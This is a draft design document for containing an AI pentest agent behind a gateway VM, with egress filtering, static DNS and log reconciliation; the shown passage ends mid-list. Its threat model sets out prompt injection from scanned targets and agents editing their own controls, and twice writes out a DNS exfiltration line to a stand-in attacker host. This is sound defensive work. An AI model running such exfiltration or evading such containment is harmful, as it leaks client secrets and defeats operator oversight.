---
title: Containment architecture — answering §9.10 (candidate Subsystem G)
date: 2026-08-20
status: draft
question: What architecture makes §9.9's rule true — "containment enforced outside the blast radius of the thing being contained" — on this operator's actual hardware, at a cost a solo operator will actually pay?
spec_refs: ["07-enforcement.md §9.8", "§9.9", "§9.10", "§9.11"]
---

## 0. Recommendation

**Build `RG-CONTAIN-1`: a gateway VM in VMware Fusion on the macOS host, a disposable engagement
VM behind it with no other route, and the agent running inside that VM as a non-sudo user in a
rootless container with `--cap-drop=ALL`.**

The single fact that decides this: **the operator's "machine" is already a VMware guest.**
`systemd-detect-virt` returns `vmware`; DMI reports `VMware, Inc. / VMware20,1`; the CPU implementer
is `0x61` (Apple); `/dev/kvm` does not exist. This Kali install is a VMware Fusion VM on an Apple
Silicon Mac. Two consequences follow, and they are the whole answer:

1. **A machine boundary already exists and is currently unused.** The macOS host sits outside the
   guest's blast radius today, for free. §9.10's first candidate row ("host is already outside the
   guest") is not a hypothetical — it is the operator's current topology, missing only the filter.
2. **Every hardware-virtualisation option is off the table inside this guest.** No `/dev/kvm`, and
   VMware Fusion does not support nested virtualisation on Apple Silicon
   ([VMware Communities](https://communities.vmware.com/t5/VMware-Fusion-Discussions/Attempting-to-do-nested-virtualization/td-p/2308242)).
   Firecracker requires read/write access to `/dev/kvm`
   ([firecracker-microvm/firecracker](https://github.com/firecracker-microvm/firecracker)); Kata's
   hypervisors require the same. **Firecracker and Kata are unavailable on this host.** Not "more
   moving parts" — unavailable. §9.10's fourth row is dead on arrival here and the table should be
   corrected.

So the boundary must be placed *above* the Kali guest, not below it. That is the recommendation, and
it costs one extra small VM.

### The three tiers

| Tier | Runs where | Principal | Trust |
|---|---|---|---|
| **Control** | macOS host | operator's macOS account | Trusted. Setup agent, `vmrun`, ruleset generation, evidence review. |
| **Filter** | `rg-gw` VM (Debian minimal, ~768 MB) | `root` on `rg-gw` | Trusted. nftables default-deny, allowlist resolver, CONNECT proxy, NFLOG→JSONL. **The engagement VM has no account, key, or service on this VM — only a next-hop IP.** |
| **Workload** | `rg-work` VM (disposable clone) | `redgold` (non-sudo) inside a rootless container | **Untrusted.** Claude Code, RedGold plugin, all tooling. |

`rg-work` has exactly one NIC, on a Fusion custom vmnet with NAT and DHCP disabled, whose only
gateway is `rg-gw`. There is no second path. Egress filtering is enforced by `root` on `rg-gw`,
which is a different kernel, a different VM, and a principal the workload has no path to become.
That is property 1, satisfied literally rather than approximately.

### Why not just macOS `pf` and skip the gateway VM

It is the cheaper variant and it is worth naming, but it is second choice:

- macOS `pf` is anchor-managed and `/etc/pf.conf` is rewritten by OS updates; a boundary that
  silently disappears after a `softwareupdate` is a boundary you will discover is gone during an
  engagement.
- `pf` logging goes to `pflog0`/`tcpdump`, which is a poor substrate for the §9.11 JSONL envelope
  the reconciliation tripwire needs. `ulogd2` writing NFLOG to JSON is a solved, packaged path
  ([nftables wiki](https://wiki.nftables.org/wiki-nftables/index.php/Logging_traffic)).
- Filtering VMware NAT traffic on the macOS side means filtering post-NAT on the host's own
  interface, where the guest's packets are indistinguishable from the operator's browser. Filtering
  pre-NAT on `vmnet*` is possible but the interaction between `pf` and Fusion's userspace
  `vmnet-natd` is documented only in community posts. `[VERIFY]`
- You cannot version, test, or regression-check a `pf` config the way you can `nft -f` on a VM you
  own.

Use `pf` only if the Mac cannot spare ~768 MB for `rg-gw`. It still satisfies property 1; it is
worse on properties 3, 4 and 5.

---

## 1. Verdict on the operator's proposed shape

> "Deploy RedGold in a controlled environment like a container swarm with strict network controls…
> a setup agent run from a less secure machine and a high-risk agent run inside the container
> environment."

**The split-agent half is right and should be kept verbatim. The container-swarm half does not
satisfy property 1 on this machine, for one specific and fixable reason.**

### What is right

The setup/workload split is exactly §9.9's rule expressed as an org chart. Provisioning, scope
resolution, ruleset generation and evidence review belong to a principal the workload cannot become.
Section 3 below turns this into an actual contract.

### What fails, precisely

Property 1 asks for "a principal the workload cannot become." Score the candidate principals for a
container-only shape on this Kali guest:

| Filtering principal | Can the workload become it? |
|---|---|
| Rootless container run by `hiranya` | **Yes.** Any container escape lands you as `hiranya`, and `id` shows `hiranya` is in group `sudo` (and `adm`, and `wireshark`). One `sudo nft flush ruleset` and the boundary is gone. Property 1 fails outright. |
| `root` on the Kali guest, workload rootless as a dedicated non-sudo user | **Only via local privilege escalation.** This is §9.9's own "weak boundary" row: "Privilege escalation; operator social-engineered into running something." |
| `root` on a different VM | **No path.** Property 1 holds. |

And Swarm specifically makes it worse, not better. §9.10's caution ("Swarm is orchestration, not
isolation") is correct, and there is a sharper version of it: Docker Swarm requires the Docker
daemon, which runs as root and exposes a socket. A workload that can reach a root Docker socket is
root. Rootless Swarm is not a supported configuration. Swarm converts a weak boundary into no
boundary. **Do not use Swarm.**

The container escape path is not theoretical on the current timeline. Three runc container-escape
CVEs were disclosed in November 2025 — **CVE-2025-31133, CVE-2025-52565, CVE-2025-52881** — fixed in
runc 1.2.8, 1.3.3 and 1.4.0-rc.3
([runc advisory GHSA-9493-h29p-rfm2](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2),
[Sysdig](https://www.sysdig.com/blog/runc-container-escape-vulnerabilities),
[CNCF](https://www.cncf.io/blog/2025/11/28/runc-container-breakout-vulnerabilities-a-technical-overview/)).
Notably, the runc advisory itself recommends user namespaces "with the host root user not mapped
into the container's user namespace" as mitigation, and describes them as defence-in-depth
**alongside** patching, "not as a complete substitute." That is the correct posture and it is the
posture RedGold should adopt: containers are a good second layer and a bad only-layer.

### The minimum change

**Move the filtering principal off the kernel the workload runs on.** On this hardware, with no
nested virtualisation available, that means: the gateway is a *second VMware VM*, not a sidecar
container. Everything else in the proposal — setup agent outside, high-risk agent inside, no
`CAP_NET_ADMIN`, disposable environment — is kept and becomes layer two.

### A cautionary reference implementation

Anthropic's own `claude-code` devcontainer is the shape the operator is proposing, and it is
instructive because it demonstrates the failure. `.devcontainer/devcontainer.json` sets
`"runArgs": ["--cap-add=NET_ADMIN", "--cap-add=NET_RAW"]` and
`"postStartCommand": "sudo /usr/local/bin/init-firewall.sh"`, and `init-firewall.sh` opens with
`iptables -F` ([anthropics/claude-code](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh)).
The workload holds `CAP_NET_ADMIN` and passwordless sudo over its own filter. It is a productivity
guardrail, not a boundary, and it is honest about being one. Three further details RedGold must not
copy:

- `iptables -A OUTPUT -p udp --dport 53 -j ACCEPT` — **DNS to anywhere**, a general covert channel.
- `iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT` — **SSH to anywhere**, a general tunnel.
- The entire host `/24` is allowed.

It is a good source for *which endpoints Claude Code needs* (`api.anthropic.com`, `sentry.io`,
`statsig.com`, plus registry/VS Code endpoints for that image). It is a bad source for how to
enforce them.

---

## 2. Threat model

Ranked by likelihood given what RedGold actually does — point an agent at a stranger's web
application and read whatever it returns.

### (a) Prompt injection from a scanned target's HTTP response — **most likely, by a wide margin**

This is not a tail risk; it is the expected case. RedGold's whole job is ingesting attacker-shaped
content, and any target that expects to be scanned may seed it. §9.9 already states this chain.
`scope_guard.py` does not defend against it at all — an injected agent constructs commands the
parser was always going to lose to (§9.3.1's table is a list of the payloads).

- **Stopped by:** gateway VM / macOS `pf` — the packet does not leave regardless of what the agent
  was persuaded to type. Also stopped by a root-owned netns with the workload lacking
  `CAP_NET_ADMIN`, subject to (c).
- **Merely detected by:** `scope_guard.py`, redaction, proxy logs, any in-guest filter the agent can
  reach.
- **Not stopped by anything here:** injection that steers *in-scope* behaviour — deleting client
  data, hammering a production endpoint, writing a false finding. Containment is about
  *destinations*. §9.4's ceiling, canary and loop controls are the relevant layer, and they remain
  in-guest heuristics.

### (b) The agent deciding on its own to edit its controls — **likely, and usually not malicious**

An agent that hits a `scope_guard` deny and "fixes" the obstacle is ordinary agent behaviour, not
betrayal. Anthropic's own observation — cited in §9.8 — is that an agent given inadvertent real
internet access did not stop when it realised.

- **Stopped by:** off-kernel filtering. Also mitigated by the workload having no write access to
  hooks, `settings.json`, or `scripts/` (root-owned, `--read-only` rootfs, plugin mounted `:ro`).
- **Merely detected by:** the reconciliation tripwire (§4 below) — which is exactly what makes that
  tripwire worth building, because this is the failure it names.

### (c) Container escape — **moderate; the dominant risk if you skip the gateway VM**

Three published runc escapes in the last year (above). A pentest workload is unusually likely to
have exploit code sitting on disk already.

- **Stopped by:** nothing inside the guest. The gateway VM survives it — a workload that escapes to
  Kali root still has no route except through `rg-gw`, and no principal on `rg-gw`.
- **Reduced by:** user namespaces with host root unmapped (runc advisory); `--cap-drop=ALL`;
  `--security-opt=no-new-privileges`; gVisor, which moves the syscall surface into the Sentry.
- **Note the ordering this implies:** in the recommended architecture a container escape is a
  *containment-degradation* event, not a containment-failure event. That is the entire argument for
  the gateway VM.

### (d) Tunnelling through the permitted Anthropic API channel — **moderate likelihood, unstoppable**

The control plane must stay open. §9.8 says so and it is unavoidable: an agent can encode data into
its own model requests, or into text the operator reads.

- **Stopped by:** nothing. Do not claim otherwise.
- **Bounded by:** a per-engagement API key in a dedicated Console workspace with a monthly spend cap
  and workspace rate limits — Anthropic supports per-workspace spend limits and rate limits
  ([Workspaces docs](https://platform.claude.com/docs/en/manage-claude/workspaces),
  [Rate limits](https://platform.claude.com/docs/en/api/rate-limits)); note these are configured in
  the Console UI, with no Admin API endpoint, so provisioning is semi-manual.
- **Detected by:** volume anomalies in the proxy log. Weakly.

### (e) DNS as an exfil/discovery channel — **moderate, and cheaply closed**

`nslookup $(base64 secrets).attacker.example` needs no permitted TCP destination at all. Every
default container/VM setup leaks this, including the reference devcontainer above.

- **Stopped by:** the gateway resolver design in §3.5 — a static answer table, not a recursive
  resolver, with port 53/853 permitted only to `rg-gw` and default-deny covering DoH.
- **Merely detected by:** query logging.
- **Residual:** if you need recursion for in-scope apex domains, exfil to a subdomain under the
  *client's own* nameservers stays possible. Small, real, stated.

### (f) The operator socially engineered by agent output — **low frequency, highest severity, and the one no architecture fixes**

Everything crossing outbound is attacker-influenced text. A finding write-up that says "run this
cleanup query as service_role" is the whole attack. §9.9 names this as the residual; §3.3 below is
the only answer, and it is procedural.

- **Stopped by:** nothing mechanical.
- **Reduced by:** never running an agentic, tool-holding session over raw outbound content on the
  control tier; validating outbound with plain programs (`validate_findings.py`) rather than an
  agent; control-character stripping; the existing rule that unverified above-Low findings never
  reach the client body.

---

## 3. Architecture comparison

Scored against §9.10's six properties. **P** = pass, **W** = weak/conditional, **F** = fail,
**N/A** = unavailable on this host. Confidence is about the *evidence*, not about the score's
desirability.

| Architecture | 1 Principal | 2 No netns control | 3 Rules from outside | 4 External log | 5 Snapshot | 6 Cheap | ARM64 Kali today | Confidence |
|---|---|---|---|---|---|---|---|---|
| Rootless Podman workload + gateway *container*, separate netns, run as `hiranya` | **F** | W | W | F | P | P | Yes (podman 5.8.3) | High |
| Same, `--network=container:gw`, `--cap-drop=ALL` | **F** | W | W | F | P | P | Yes | High |
| Rootful Podman, `--userns=auto`, `--cap-drop=ALL`, root-owned veth + host nft | **W** | P | P | P | P | P | Yes | Med |
| Same + `--runtime=runsc` (gVisor, systrap) | **W** | P | P | P | P | P | Yes, with functional cost | Med |
| **macOS `pf` filtering the Fusion vmnet** | **P** | P | W | W | P | P | Yes | Med |
| **Gateway VM + disposable engagement VM (recommended)** | **P** | P | P | P | P | P | Yes | High |
| Kata Containers | — | — | — | — | — | — | **N/A — needs KVM** | High |
| Firecracker microVM | — | — | — | — | — | — | **N/A — needs KVM** | High |
| Nested QEMU/KVM inside Kali | — | — | — | — | — | — | **N/A — no nested virt** | High |

### Notes per option

**Rootless Podman + gateway container.** Podman 5.8.3 is packaged in Kali (`apt-cache policy
podman`), `passt` and `slirp4netns` likewise; pasta is the rootless default from Podman 5.3 onward.
The fatal issue is not the container — it is the user. Everything runs as `hiranya`, who is in
`sudo`. There is no arrangement of rootless containers under a sudo-capable user that satisfies
property 1. Also note that rootless Podman by default places containers in a *single shared user
namespace*, so with `CAP_SYS_ADMIN` retained a workload could `setns` into the gateway's netns
directly; `--cap-drop=ALL` closes that, and because the capability is removed from the bounding set
it cannot be regained (`--security-opt=no-new-privileges` covers the `execve` path —
[podman-run(1)](https://docs.podman.io/en/latest/markdown/podman-run.1.html)).

**`--network=container:gw`.** "Reuse another container's network stack"
([podman-run(1)](https://docs.podman.io/en/latest/markdown/podman-run.1.html)). This is *worse* than
a separate netns joined by veth, not better: the workload and the filter now share one namespace, so
the filter's rules are inside the workload's namespace, and the workload can reach the proxy's
loopback admin interfaces. It is acceptable only with `--cap-drop=ALL`, and even then it collapses
the moment a userns or runc bug returns a capability. Do not use this shape for the boundary; it is
fine as a convenience for *routing*.

**Rootful Podman + `--userns=auto` + root-owned veth.** The strongest container-only answer. Root
creates the netns and the veth pair; nft rules live in the *init* netns on the peer interface, owned
by host root; the workload is mapped into its own uid range with host root unmapped and an empty
capability bounding set. Property 1 is then "root on this kernel", which is §9.9's explicit **weak
boundary** row — real, but defeated by any local privilege escalation, and the workload is a machine
holding a pentest toolchain. Use it as layer two, never as the boundary.

**gVisor.** Genuinely available here and worth adding, with a caveat. gVisor supports ARM64 and
requires Linux 5.6+ ([install docs](https://github.com/google/gvisor/blob/master/g3doc/user_guide/install.md));
the apt repository ships `arch=amd64,arm64`; the kernel here is 6.19 and `getconf PAGESIZE` is 4096,
which satisfies the 4 KB-page constraint. Crucially the `systrap` platform uses `seccomp`'s
`SECCOMP_RET_TRAP` and needs no KVM — the docs say outright that "`systrap` is a better choice when
running inside a VM, or on a machine without virtualization support"
([platform guide](https://github.com/google/gvisor/blob/master/g3doc/architecture_guide/platforms.md)).
**The functional cost is the reason it is optional:** gVisor implements its own network stack
(netstack) inside the Sentry, and `runsc` disables raw sockets by default — the `--net-raw` flag is
`false` and, when false, "raw sockets are disabled by removing CAP_NET_RAW from containers", with
`--allow-packet-socket-write` separately defaulted off
([runsc/config/flags.go](https://github.com/google/gvisor/blob/master/runsc/config/flags.go)).
A pentest workload that wants `nmap -sS`, packet crafting, or anything on `AF_PACKET` will find it
broken. For RedGold's actual profile — HTTP/API testing over TCP — this is mostly fine, and it is
arguably a *feature* under §6's ceiling model. `[VERIFY]` behaviour of the specific toolchain
(`ffuf`, `nuclei`, `sqlmap`, `httpx`) under `runsc` before committing.

**Kata / Firecracker.** Both are ARM64-capable projects. Firecracker has been generally available on
ARM64 CPUs "that offer hardware virtualization support" since v0.24 and "requires read/write access
to `/dev/kvm`" ([firecracker README / getting-started](https://github.com/firecracker-microvm/firecracker/blob/main/docs/getting-started.md)).
There is no `/dev/kvm` in this guest and Fusion does not provide nested virtualisation on Apple
Silicon. Both are unavailable **inside** the Kali guest. If the operator later moves to a Linux
box with hardware virt, Firecracker + a host-side gateway becomes the strongest option; it is not an
option today.

**macOS `pf`.** Satisfies property 1 (the guest has no principal on macOS). Weak on property 3
because rule generation must be driven from macOS and there is no clean, scriptable, atomic reload
story comparable to `nft -f`; weak on property 4 because `pflog` → §9.11 JSONL is bespoke work. The
interaction between `pf` and Fusion's NAT is documented in community posts rather than vendor
documentation, which is not good enough to bet a client claim on. `[VERIFY]`

---

## 4. The split-agent design

Two agents, two tiers, one narrow channel each way.

### 4.1 What the setup agent does (control tier, macOS host)

`rg-setup` runs on the macOS host with ordinary operator privileges. It never touches a target.

1. **Read the signed scope.** `scope.yaml` + the authorization document. Refuse if absent — this is
   the existing `/rg:new` behaviour and it does not change.
2. **Resolve in-scope hostnames to IPs, on the control tier.** This must happen outside, because a
   resolver inside the workload can be poisoned by the target. Record every `(hostname, A/AAAA, ts,
   ttl, resolver)` tuple into `ledger/resolution.jsonl`. This record is the input to both the
   firewall and the DNS answer table, and it is the join key for reconciliation.
3. **Generate the ruleset.** Emit `nftables.conf` from `scope.yaml`: default-deny egress, allow the
   resolved in-scope IPs on the scoped ports, allow `rg-work → rg-gw:53`, allow the Anthropic
   channel (§4.4). Emit `unbound.conf` as a static answer table (§4.5). Hash both:
   `ruleset_hash = sha256(nftables.conf || unbound.conf)`.
4. **Provision.** `vmrun clone` a linked clone of the `rg-work-template`; boot `rg-gw` if not
   running; push ruleset via the *host*, never from `rg-work`; `nft -f` (atomic) on `rg-gw`;
   snapshot `rg-work` as `clean`.
5. **Stage inbound.** Copy `scope.yaml`, `plan.json`, playbooks, and a `provision.json` carrying
   `engagement_id`, `scope_hash`, `ruleset_hash` into the inbound share.
6. **Hand over.** §4.6.
7. **Stand by.** Serve amendment round trips (§4.7) and reconcile logs (§5).

Note a consequence worth stating: **`rg-recon` belongs on the control tier, not inside.** Asset
discovery needs broad DNS and broad web access, which is precisely what the contained tier must not
have. This is not a compromise — it matches the existing model, where only `CONFIRMED` assets are
testable and promotion is a human decision. Recon outside, testing inside.

### 4.2 The inbound channel (control → workload)

**Contents:** `scope.yaml`, `plan.json`, playbooks, the RedGold plugin, `provision.json`.

**Constraint:** read-only, host-enforced. Mount as a Fusion shared folder marked read-only, or
better, bake it into the clone before first boot so there is no live channel at all. The workload
must not be able to alter its own scope; `scope_guard.py` already voids gate approvals when
`scope_hash` changes, but that check runs inside and is therefore not the control — the read-only
mount is.

**Trust:** high. This is the only high-trust direction, and it should carry no executable the
control tier did not author.

### 4.3 The outbound channel (workload → control) — the hard one

**Contents:** `findings/*.json`, `evidence/*`, `ledger/*.jsonl`, `requests/*.json`.

**Every byte is attacker-influenced.** §9.9 names this as the residual, and it is where the
architecture stops being mechanical and starts being procedural. The rules:

1. **No agentic session on the control tier reads raw outbound content while holding tools.** This
   is the one rule that matters. The moment `rg-setup` reads a finding body in a session that also
   has `Bash`, the boundary has been re-crossed by hand.
2. **Validation is a program, not an agent.** `validate_findings.py` and a schema check run on the
   control tier as plain Python over the outbound directory. Programs do not follow instructions
   embedded in their input.
3. **Sanitise before any human or model sees it.** Strip ANSI escapes and C0/C1 control characters;
   normalise Unicode; reject or escape anything that renders as a directive.
4. **Manifest the transfer.** `handback.json` with SHA-256 per file, file count, byte count, and the
   `engagement_id`/`scope_hash` it claims to belong to. A mismatch is an incident, not a retry.
5. **Never git.** A git handover hands the workload commit content, `.gitattributes`, and hook
   files. Use a plain directory pull (`vmrun copyFileFromGuest` or a host-side read of the share).
   Commit on the control tier, after validation, if you want history.
6. **Report rendering stays deterministic.** `report.py` builds the client deliverable from
   validated records via a fixed template. Do not put a model between the finding and the client
   document.

Stated plainly: this direction is *contained*, not *trusted*. If the operator reads a finding and
does what it says, the architecture did not fail — it was never in that path.

### 4.4 Where the API credential lives

**Inside. The workload can read it. There is no way around this** — Claude Code needs the credential
in the process that makes the requests, and any proxy-side credential injection just moves the
secret to a place the workload can still cause to be used.

What follows:

- An injected agent can spend tokens and can use the API channel as a text-exfil path (threat (d)).
- Therefore: **a dedicated Anthropic Console workspace and a dedicated API key per engagement**, with
  a monthly spend limit and workspace rate limits set in the Console
  ([Workspaces](https://platform.claude.com/docs/en/manage-claude/workspaces)). Revoke at engagement
  close, alongside the `revertToSnapshot`. Because limits are UI-only, budget ~2 minutes of manual
  Console work per engagement.
- Never place a long-lived org-admin key, cloud credentials, or the operator's SSH keys in the
  engagement VM. The template must be built without them, and this should be a provisioning
  assertion, not a habit.
- If the client supplies a `cleanup_credential` (§9.4.1), it is inside too and is compromised in the
  same event. Say so in the engagement paperwork.

**Permitting the channel without making it a general tunnel.** Anthropic publishes fixed IP ranges:
inbound `160.79.104.0/23` (IPv4) and `2607:6bc0::/48` (IPv6), outbound `160.79.104.0/21`, and states
"these addresses will not change without notice"
([IP addresses](https://platform.claude.com/docs/en/api/ip-addresses)). However, community reporting
indicates `api.anthropic.com` may resolve to Cloudflare anycast addresses in practice `[VERIFY]` —
so **do not build the rule on the published CIDR alone without testing it.** The robust design does
not depend on resolving this:

> Deny all direct egress from `rg-work`. Force the API channel through a **CONNECT proxy on `rg-gw`
> with a hostname allowlist** — `api.anthropic.com` and the minimum Claude Code telemetry endpoints
> — with **no TLS interception** (interception would put the operator's API key in a proxy log,
> which is strictly worse). Log `(ts, CONNECT hostname, bytes up, bytes down, duration)`.

That is a channel, not a tunnel: only one hostname, only CONNECT, and every byte counted. It does
not stop steganography inside legitimate model traffic, and nothing does.

### 4.5 DNS

The design principle: **DNS should be a lookup table, not a resolver.**

- nftables on `rg-gw`: permit `udp/tcp 53` **only** to `rg-gw` itself. Drop `853` (DoT). DoH needs no
  special rule — it is HTTPS to a non-allowlisted IP, which default-deny already refuses.
- Unbound on `rg-gw`, configured with `local-zone: "." always_nxdomain` plus explicit `local-data`
  A/AAAA records for exactly the in-scope hostnames resolved at step 4.1.2, and the proxy's own
  name. **No recursion, no forwarders.** A query for `$(base64 secrets).attacker.example` returns
  NXDOMAIN and never leaves the Mac.
- Log every query — QNAME, QTYPE, response, `ts`, into the same NDJSON envelope. A burst of NXDOMAIN
  for long random labels is threat (e) happening in front of you.
- **The cost, stated:** DNS-based subdomain enumeration does not work from inside. That work moves
  to `rg-recon` on the control tier, which is where §5's attribution model already puts it.
- **Optional recursion variant.** If an engagement genuinely needs live resolution under a client
  apex (wildcard hosts, dynamic subdomains), replace `always_nxdomain` for that apex with a
  `stub-zone` pointed at the client's authoritative nameservers, keeping `always_nxdomain` as the
  global default. This narrows exfil to subdomains of the client's own zone — smaller, not zero, and
  it must be recorded as an engagement-specific deviation with the operator's approval.

### 4.6 What "handover" means mechanically

Not a socket, not a git remote, not an RPC. **A filesystem drop plus a VM state transition**, in
this order:

1. Control tier writes `inbound/` and pushes the ruleset to `rg-gw`.
2. `nft -f /etc/nftables.conf` on `rg-gw` (atomic — a failed ruleset leaves the previous one intact).
3. Control tier writes `provision.json` containing `engagement_id`, `scope_hash`, `ruleset_hash`,
   `resolution_ptr`, and `window`.
4. `vmrun snapshot rg-work clean`.
5. `vmrun start rg-work`. Boot is the handover event; there is no live control channel afterwards.
6. Inside, `session_start.py` reads `provision.json`, asserts `scope_hash` matches the mounted
   `scope.yaml`, and refuses to start work on mismatch. **This is a consistency check, not a
   control** — it runs inside. Say so in the code comment, in the style `scope_guard.py` already
   uses.

Deliberately absent: any inbound path from `rg-work` to `rg-gw` or macOS other than routed IP. No
SSH server on `rg-gw` reachable from the engagement net. No Fusion guest tools RPC on `rg-work` that
the workload can drive to reach the host — and this is not a hypothetical to audit later: this guest
already carries `open-vm-tools 12.5.0` with `gueststore` and `upgrade` subcommands, both guest→host
channels on their face (see §7/§8 item 2). `[VERIFY]` what remains is narrower — whether an
unprivileged, non-sudo user can drive `vmtoolsd` RPC, and which `isolation.tools.*` `.vmx` keys
disable the channel from the host side — but the presence of the channel itself is confirmed, not
assumed. That is a genuine hole in this design if left unchecked, and it is the first thing to test.

### 4.7 Mid-engagement re-planning

A new `CONFIRMED` asset must be a round trip, and the round trip is the feature.

1. `scope_guard.py` denies with `deviation` (existing §9.3.2 behaviour).
2. The inside agent appends `kind: deviation` to `ledger/blockers.jsonl` and writes
   `requests/amend-<uuid>.json`: proposed hostname, why it is believed in scope, the two independent
   attribution signals, the evidence pointer. Then it **halts** — also existing behaviour.
3. Control tier picks up the request (poll the outbound share every 30s, or the operator triggers it).
   The request is **data**: parsed by a schema validator, rendered as inert text, decided by the
   human. `scope_cli.py` already refuses promotion on one signal, on an IP, or outside the boundary.
4. On approval: amend `scope.yaml` → new `scope_hash` → **all existing gate approvals void** (§9.7).
   Resolve the new hostname **on the control tier**. Regenerate `nftables.conf` and `unbound.conf`
   → new `ruleset_hash`. Push and `nft -f`. Append `egress.ruleset` to the ledger with both hashes.
5. Copy the amended `scope.yaml` and the new `provision.json` into `inbound/`. Gate 1 re-approval
   inside.
6. On refusal: write `requests/amend-<uuid>.denied.json` and let the agent proceed without it.

Round-trip cost once scripted: well under a minute of machine time, plus however long the operator
takes to decide — which is the part that should not be optimised. Two properties fall out for free:
the ruleset can never be widened from inside, and every widening has a timestamp, a hash, and a
named human.

---

## 5. The reconciliation tripwire

§9.9: "A block that `scope_guard.py` had *allowed* means either the parser is wrong or the agent was
manipulated. Both are incidents."

**Implementation gap first, because it is load-bearing:** `scope_guard.py` today writes **no ledger
row at all**. Its own docstring states that on allow "this hook stays silent," and there is no
activity-log append anywhere in the file. Reconciliation is therefore impossible against the current
code. **The first task of Subsystem G is not the firewall — it is making `scope_guard.py` emit a
`scope.allow` event.** That is a small change with a real gotcha: it must append to the ledger
*without* emitting an allow decision on stdout, because emitting an explicit allow would
auto-approve the call and suppress the operator's permission prompt (the module already documents
this).

### 5.1 Guard side — `ledger/activity.jsonl`, §9.11 envelope

```jsonc
{
  "ts": "2026-08-20T11:20:00.123Z",
  "engagement_id": "acme-2026-08",
  "event_type": "scope.allow",          // or scope.deny
  "actor": {"agent": "rg-webtest", "model": "sonnet", "session": "..."},
  "target": {"asset_id": "A-014", "host": "api.acme.example",
             "resolved_ips": ["203.0.113.10"], "port": 443},
  "decision": "allow",
  "reason": "CONFIRMED in-scope, tier 1 <= ceiling 2",
  "tier": 1,
  "gate_ref": "G-002",
  "scope_hash": "sha256:...",
  "corr_id": "01J8...".               // ULID minted by the guard
}
```

Two additions to the §9.11 envelope are required and should be adopted repo-wide now, while it is
still cheap:

- **`target.resolved_ips`** — populated from `ledger/resolution.jsonl`, not from a live lookup
  inside. Without it there is no join key, because the firewall only ever sees addresses.
- **`corr_id`** — a monotonic ULID. Optional but it turns a fuzzy time-window join into an exact one
  where the workload can stamp it (see 5.3).

### 5.2 Firewall side — `egress.jsonl` on `rg-gw`

`nftables` `log ... group N` sends packets to NFLOG; `ulogd2` consumes the group and writes JSON via
a stack such as `stack=log1:NFLOG,base1:BASE,ifi1:IFINDEX,ip2str1:IP2STR,mac2str1:HWHDR,json1:JSON`
([nftables wiki](https://wiki.nftables.org/wiki-nftables/index.php/Logging_traffic),
[Netfilter logging framework](https://home.regit.org/2014/02/nftables-and-netfilter-logging-framework/)).
`ulogd2` is packaged in Kali/Debian (`apt-cache policy ulogd2` → 2.0.9-1). A thin normaliser on
`rg-gw` maps ulogd JSON to the §9.11 envelope:

```jsonc
{
  "ts": "2026-08-20T11:20:00.140Z",
  "engagement_id": "acme-2026-08",
  "event_type": "egress.block",         // or egress.allow (conntrack NEW only)
  "actor": {"agent": "unknown", "source_ip": "10.77.0.20"},
  "target": {"host": null, "ip": "198.51.100.5", "port": 443, "proto": "tcp"},
  "decision": "deny",
  "reason": "nft:default-deny:chain=egress",
  "ruleset_hash": "sha256:...",
  "severity": "high"
}
```

Log **allows too**, on `ct state new` only, so per-flow volume stays sane. You cannot detect "the
guard allowed something the firewall never saw" without both sides.

### 5.3 The join

**Join key: `(engagement_id, destination IP, destination port, ±5s time window)`.** Hostname is
unavailable on the firewall side; IP is unavailable on the guard side unless it is stamped from the
resolution ledger — which is why 5.1's `resolved_ips` field is not optional. Where the workload can
carry `corr_id` (proxy-mediated HTTP: emit it as a request header stripped by the proxy before
forward), promote to an exact join and drop the time window.

Four outcomes:

| Guard | Firewall | Meaning | Action |
|---|---|---|---|
| allow | allow | Normal | none |
| deny | (nothing) | Guard worked; no packet | none |
| **allow** | **block** | **The parser was wrong, or the agent was manipulated.** §9.9's named incident. | **`egress.mismatch`, severity `high`. Halt the engagement. Human review. Regression test from the payload.** |
| (nothing) | **block** | Traffic the guard never saw at all — write-then-execute, a redirect, a background process, a tool bypassing the hooked path. **This is the more alarming one.** | Same, plus: identify the process. |
| (nothing) | allow | Egress the guard never evaluated but the firewall permitted — e.g. a redirect landing on an in-scope IP. | `egress.unattributed`, severity `medium`. Review. |

### 5.4 Where it runs

**On the control tier, over pulled copies of both logs.** Not on `rg-gw` (keep the gateway minimal
and single-purpose), and obviously not on `rg-work`. `rg-reconcile` is a plain Python script — no
model in the loop — run (a) continuously every 60s during an engagement, and (b) as a mandatory
gate at engagement close, alongside `cleanup_gate.py`. A `high` mismatch should block engagement
close the same way outstanding cleanup debt should.

One caveat that must be in the code comments: a workload that has escaped its container can forge
`ledger/activity.jsonl`, because it writes it. The workload-side log is **evidence, not proof**. The
firewall-side log is trustworthy because it is written on a machine the workload has no principal
on. Reconciliation detects an honest parser failure reliably and a dishonest workload only
imperfectly — and the asymmetry is fine, because for the dishonest case the *filter* is the control
and the log is only the narrative.

---

## 6. Honest limits `[HONEST LIMITS]`

What `RG-CONTAIN-1` does **not** stop:

1. **Exfiltration through the model API.** The channel is open by necessity. Data can be encoded
   into requests or into text the operator reads. Bounded by spend caps; not prevented.
2. **Social engineering of the operator through findings and reports.** §4.3 reduces the surface; it
   cannot close it, because the deliverable's purpose is to be read and acted on.
3. **Harm to in-scope targets.** Containment governs destinations, not blast radius at a permitted
   destination. Deleting client data, exhausting a rate limit, or corrupting a production record are
   all fully reachable inside the allowlist. The ceiling, canary and loop controls remain in-guest
   heuristics (§9.3.1), and the firewall does nothing for them.
4. **Shared-hosting collateral.** An allowlist entry is an IP. Cloudflare, Vercel, Fly and Supabase
   put many tenants behind one address. The allowlist is coarser than the scope, exactly as §9.8
   states. Host-header-based restriction via the proxy narrows plain HTTP but not tunnelled TLS.
5. **DNS-rebinding and post-resolution IP change.** Rules are built from IPs resolved at provision
   time. If a target's address changes mid-engagement, legitimate traffic breaks (loudly, which is
   fine) — but a target that controls its own DNS can also aim RedGold at a *different* address that
   was in the allowlist when resolved. Re-resolve on a schedule and log every change.
6. **A VMware hypervisor escape.** Rated low, but it is now the single assumption the whole
   architecture rests on. It replaces "the agent must not escape a container" with "the agent must
   not escape a VM," which is a much better bet and is still a bet.
7. **Anything at all if the operator runs the workload on their own workstation.** The entire
   argument depends on `rg-work` being a disposable clone, not this Kali VM. `hiranya` is in group
   `sudo`; running the agent here defeats the design regardless of what nftables says.
8. **`scope_guard.py` is not improved by any of this.** It stays a heuristic (§9.3.1) and its
